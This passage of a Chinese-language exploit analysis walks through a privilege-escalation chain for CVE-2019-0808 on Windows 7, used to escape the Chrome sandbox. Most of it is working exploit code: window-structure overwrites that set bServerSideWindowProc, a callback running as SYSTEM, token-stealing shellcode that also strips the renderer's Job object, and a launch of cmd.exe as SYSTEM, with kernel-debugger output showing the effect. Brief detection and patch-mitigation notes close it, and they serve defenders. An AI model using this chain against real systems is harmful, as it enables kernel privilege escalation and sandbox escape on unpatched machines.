printf("[!] SetWindowLongA malicious error: 0x%08Xrn", GetLastError());  
ExitProcess(-1);  
}  
else {  
printf("[*] SetWindowLongA called to set strName.Buffer address. Current
strName.Buffer address that is being adjusted: 0x%08Xrn",
(addressOfStartofPrimaryWndCbWndData + offset));  
}`
此代码的开始部分，将检查窗口消息是否为0x15。如果是，代码将计算primaryWindow的wndExtra数据部分的开始与secondaryWindow的strName.Buffer指针的位置之间的距离。这两个位置之间的差异将保存到变量offset中。
完成此操作后，使用hPrimaryWindow调用SetWindowLongA()，并使用offset变量将secondaryWindow的strName.Buffer指针设置为secondaryWindow的bServerSideWindowProc字段的地址。该操作的效果如下图所示。
通过执行此操作，当在secondaryWindow上调用SetWindowText()时，它将继续使用其覆盖的strName.Buffer指针来确定应该执行写入的位置，如果这里有适当的值，那么将导致secondaryWindow的bServerSideWindowProc标记被覆盖作为SetWindowText()的IpString参数提供。
利用tagWND写入原语以设置bServerSideWindowProc位
将secondaryWindow中的strName.Buffer字段设置为secondaryWindow的bServerSideWindowProc标志的地址后，使用hWnd参数hSecondaryWindow和lpString值“x06”调用SetWindowText()，以便在secondaryWindow中启用bServerSideWindowProc标志。
`// Write the value x06 to the address pointed to by hSecondaryWindow's
strName.Buffer  
// field to set the bServerSideWindowProc bit in hSecondaryWindow.  
if (SetWindowTextA(hSecondaryWindow, "x06") == 0) {  
printf("[!] SetWindowTextA couldn't set the bServerSideWindowProc bit. Error
was: 0x%08Xrn", GetLastError());  
ExitProcess(-1);  
}  
else {  
printf("Successfully set the bServerSideWindowProc bit at: 0x%08Xrn",
(secondaryWindowAddress + 0x16));`
下图展示了在调用SetWindowTextA()之前和之后，secondaryWindow的tagWND布局。
设置bServerSideWindowProc标志可确保secondaryWindow的窗口过程sprayCallback()现在将以具有SYSTEM级别权限的内核模式运行，而不是像大多数其他窗口过程一样在用户模式下运行。这是一种流行的特权提升方法，并且已经在许多攻击中运用，例如Sednit
APT组织在2017年发动的攻击。下图更加详细地说明了这一点。
窃取进程令牌并移除作业限制
在完成对SetWindowTextA()的调用后，将向hSecondaryWindow发送WM_ENTERIDLE消息，如下述代码所示。
`printf("Sending hSecondaryWindow a WM_ENTERIDLE message to trigger the
execution of the shellcode as SYSTEM.rn");  
SendMessageA(hSecondaryWindow, WM_ENTERIDLE, NULL, NULL);  
if (success == TRUE) {  
printf("[*] Successfully exploited the program and triggered the
shellcode!rn");  
}  
else {  
printf("[!] Didn't exploit the program. For some reason our privileges were
not appropriate.rn");  
ExitProcess(-1);  
}`
随后，secondaryWindow的窗口过程sprayCallback()将获取WM_ENTERIDLE消息。该功能的代码如下所示。
`// Tons of thanks go to
https://github.com/jvazquez-r7/MS15-061/blob/first_fix/ms15-061.cpp for  
// additional insight into how this function should operate. Note that a token
stealing shellcode  
// is called here only because trying to spawn processes or do anything
complex as SYSTEM  
// often resulted in APC_INDEX_MISMATCH errors and a kernel crash.  
LRESULT CALLBACK sprayCallback(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM
lParam)  
{  
if (uMsg == WM_ENTERIDLE) {  
WORD um = 0;  
__asm  
{  
// Grab the value of the CS register and  
// save it into the variable UM.  
mov ax, cs  
mov um, ax  
}  
// If UM is 0x1B, this function is executing in usermode  
// code and something went wrong. Therefore output a message that  
// the exploit didn't succeed and bail.  
if (um == 0x1b)  
{  
// USER MODE  
printf("[!] Exploit didn't succeed, entered sprayCallback with user mode
privileges.rn");  
ExitProcess(-1); // Bail as if this code is hit either the target isn't  
// vulnerable or something is wrong with the exploit.  
}  
else  
{  
success = TRUE; // Set the success flag to indicate the sprayCallback()  
// window procedure is running as SYSTEM.  
Shellcode(); // Call the Shellcode() function to perform the token stealing
and  
// to remove the Job object on the Chrome renderer process.  
}  
}  
return DefWindowProc(hWnd, uMsg, wParam, lParam);  
}`
由于已经在secondaryWindow的tagWND对象中设置了bServerSideWindowProc标志，因此现在应该以SYSTEM用户身份运行sprayCallback()。sprayCallback()函数首先检查传入消息是否为WM_ENTERIDLE消息。如果是，那么内联Shellcode将确保sparyCallback()确实作为SYSTEM用户运行。如果该检查通过，那么布尔型变量将成功设置为TRUE，以指示攻击成功，随后执行函数Shellcode()。
Shellcode()将使用abatchy博客文章中展示的Shellcode执行一个简单的令牌窃取攻击，在下面的代码中重点展示，并做了两处微小的修改。
    // Taken from https://www.abatchy.com/2018/01/kernel-exploitation-2#token-stealing-payload-windows-7-x86-sp1.
    // Essentially a standard token stealing shellcode, with two lines
    // added to remove the Job object associated with the Chrome
    // renderer process.
    declspec(noinline) int Shellcode()
    {
    asm {
    xor eax, eax // Set EAX to 0.
    mov eax, DWORD PTR fs : [eax + 0x124] // Get nt!_KPCR.PcrbData.
    // _KTHREAD is located at FS:[0x124]
              mov eax, [eax + 0x50] // Get nt!_KTHREAD.ApcState.Process
              mov ecx, eax // Copy current process _EPROCESS structure
              xor edx, edx // Set EDX to 0.
              mov DWORD PTR [ecx + 0x124], edx // Set the JOB pointer in the _EPROCESS structure to NULL.
              mov edx, 0x4 // Windows 7 SP1 SYSTEM process PID = 0x4
              SearchSystemPID:
                     mov eax, [eax + 0B8h] // Get nt!_EPROCESS.ActiveProcessLinks.Flink
                     sub eax, 0B8h
                     cmp [eax + 0B4h], edx // Get nt!_EPROCESS.UniqueProcessId
                     jne SearchSystemPID
              mov edx, [eax + 0xF8] // Get SYSTEM process nt!_EPROCESS.Token
              mov [ecx + 0xF8], edx // Assign SYSTEM process token.
       }
    }
这里的修改采用了Chrome渲染器进程的EPROCESS结构，并且其作业指针为NULL。这样做的目的，是因为在尝试过程中发现，即使Shellcode窃取了SYSTEM令牌，该令牌仍然会继承Chrome渲染器进程的作业对象，从而阻止漏洞利用生成任何子进程。在更改Chrome渲染器进程的令牌之前，将Chrome渲染器进程中的作业指针清空，将会从Chrome渲染器进程和稍后分配给它的任何令牌中删除作业限制，从而防止这种情况发生。
为了更好地理解对作业对象进行NULL操作的重要性，我们需要检查以下令牌转储，以获取正常的Chrome渲染器进程。需要注意的是，作业对象字段已经填写，因此作业对象限制当前正在应用于该进程。
    0: kd> !process C54
    Searching for Process with Cid == c54
    PROCESS 859b8b40 SessionId: 2 Cid: 0c54 Peb: 7ffd9000 ParentCid: 0f30
    DirBase: bf2f2cc0 ObjectTable: 8258f0d8 HandleCount: 213.
    Image: chrome.exe
    VadRoot 859b9e50 Vads 182 Clone 0 Private 2519. Modified 718. Locked 0.
    DeviceMap 9abe5608
    Token a6fccc58
    ElapsedTime 00:00:18.588
    UserTime 00:00:00.000
    KernelTime 00:00:00.000
    QuotaPoolUsage[PagedPool] 351516
    QuotaPoolUsage[NonPagedPool] 11080
    Working Set Sizes (now,min,max) (9035, 50, 345) (36140KB, 200KB, 1380KB)
    PeakWorkingSetSize 9730
    VirtualSize 734 Mb
    PeakVirtualSize 740 Mb
    PageFaultCount 12759
    MemoryPriority BACKGROUND
    BasePriority 8
    CommitCharge 5378
    Job 859b3ec8
        THREAD 859801e8  Cid 0c54.08e8  Teb: 7ffdf000 Win32Thread: fe118dc8 WAIT: (UserRequest) UserMode Non-Alertable
            859c6dc8  SynchronizationEvent
为了确认这些限制确实存在，我们可以在Process Explorer中检查该进程的进程令牌。通过该进程，能够确认作业确实存在许多限制，比如禁止生成子进程。
如果该进程令牌中的“作业”字段设置为NULL，则WinDBG的!process命令不会再将作业与对象关联。
    1: kd> dt nt!_EPROCESS 859b8b40 Job
    +0x124 Job : 0x859b3ec8 _EJOB
    1: kd> dd 859b8b40+0x124
    859b8c64 859b3ec8 99c4d988 00fd0000 c512eacc
    859b8c74 00000000 00000000 00000070 00000f30
    859b8c84 00000000 00000000 00000000 9abe5608
    859b8c94 00000000 7ffaf000 00000000 00000000
    859b8ca4 00000000 a4e89000 6f726863 652e656d
    859b8cb4 00006578 01000000 859b3ee0 859b3ee0
    859b8cc4 00000000 85980450 85947298 00000000
    859b8cd4 862f2cc0 0000000e 265e67f7 00008000
    1: kd> ed 859b8c64 0
    1: kd> dd 859b8b40+0x124
    859b8c64 00000000 99c4d988 00fd0000 c512eacc
    859b8c74 00000000 00000000 00000070 00000f30
    859b8c84 00000000 00000000 00000000 9abe5608
    859b8c94 00000000 7ffaf000 00000000 00000000
    859b8ca4 00000000 a4e89000 6f726863 652e656d
    859b8cb4 00006578 01000000 859b3ee0 859b3ee0
    859b8cc4 00000000 85980450 85947298 00000000
    859b8cd4 862f2cc0 0000000e 265e67f7 00008000
    1: kd> dt nt!_EPROCESS 859b8b40 Job
    +0x124 Job : (null)
    1: kd> !process C54
    Searching for Process with Cid == c54
    PROCESS 859b8b40 SessionId: 2 Cid: 0c54 Peb: 7ffd9000 ParentCid: 0f30
    DirBase: bf2f2cc0 ObjectTable: 8258f0d8 HandleCount: 214.
    Image: chrome.exe
    VadRoot 859b9e50 Vads 180 Clone 0 Private 2531. Modified 720. Locked 0.
    DeviceMap 9abe5608
    Token a6fccc58
    ElapsedTime 00:14:15.066
    UserTime 00:00:00.015
    KernelTime 00:00:00.000
    QuotaPoolUsage[PagedPool] 351132
    QuotaPoolUsage[NonPagedPool] 10960
    Working Set Sizes (now,min,max) (9112, 50, 345) (36448KB, 200KB, 1380KB)
    PeakWorkingSetSize 9730
    VirtualSize 733 Mb
    PeakVirtualSize 740 Mb
    PageFaultCount 12913
    MemoryPriority BACKGROUND
    BasePriority 4
    CommitCharge 5355
        THREAD 859801e8  Cid 0c54.08e8  Teb: 7ffdf000 Win32Thread: fe118dc8 WAIT: (UserRequest) UserMode Non-Alertable
            859c6dc8  SynchronizationEvent
再次检查Process
Explorer，我们可以确认，由于Chrome渲染的进程令牌中的“作业”字段已为NULL，因此不再有与Chrome渲染器进程关联的任何作业。我们可以在下面的屏幕截图中看到，Chrome渲染器进程无法再使用“作业”选项卡，因为不再有任何作业与之关联，也就意味着它现在可以生成任何想要的子进程。
###  生成新进程
一旦Shellcode()执行完成，WindowHookProc()将进行检查，以查看变量success是否设置为TRUE，该变量表明漏洞利用已经成功完成。如果已经成功完成，那么它将在返回执行到main()之前打印成功的消息。
`if (success == TRUE) {  
printf("[*] Successfully exploited the program and triggered the
shellcode!rn");  
}  
else {  
printf("[!] Didn't exploit the program. For some reason our privileges were
not appropriate.rn");  
ExitProcess(-1);  
}`  
main()将退出其窗口消息处理循环，因为后续没有更多的消息需要处理。随后，会执行检查，确认是否成功（设置为TRUE）。如果是，则将执行堆WinExec()的调用，以使用被盗的SYSTEM令牌执行具有SYSTEM权限的cmd.exe。  
`// Execute command if exploit success.  
if (success == TRUE) {  
WinExec("cmd.exe", 1);  
}`
## 威胁检测
我们可以通过测试用户模式下的应用程序行为来检测漏洞利用活动，并判断目标程序是否调用了CreateWindow()或是否使用了IpClassName参数“#32768”来调用CreateWindowEx()。任何用户模式下的合法应用程序都不会轻易使用类字符串“#32768”，因为它主要是操作系统在使用的，因此当我们检测到相关行为时，可以判定为漏洞利用活动。
## 缓解方案
运行Windows
8或更高版本操作系统可以防止攻击者利用该漏洞，因为新版本操作系统可以防止应用程序映射内存地址中前64KB的内容。这也就意味着，攻击者将无法分配NULL页面，或靠近NULL页面的内存地址，例如0x30。除此之外，将操作系统更新至Windows
或更高版本，还可以允许Chrome沙盒屏蔽所有针对win32k.sys的所有调用，这样就可以防止攻击者通过调用NtUserMNDragOver()来触发该漏洞了。
在Windows
7上，唯一的威胁缓解方案就是安装更新补丁KB4489878或KB4489885，大家可以从漏洞CVE-2019-0808的安全公告页面中下载并安装更新补丁。
## 总结
开发一种Chrome沙盒逃逸技术，需要满足很多的条件。但是，通过利用Windows
7等操作系统本身的安全缺陷，比如说win32k.sys中的漏洞，攻击者仍然可以实现Chrome沙盒逃逸，并构建0 day漏洞利用链。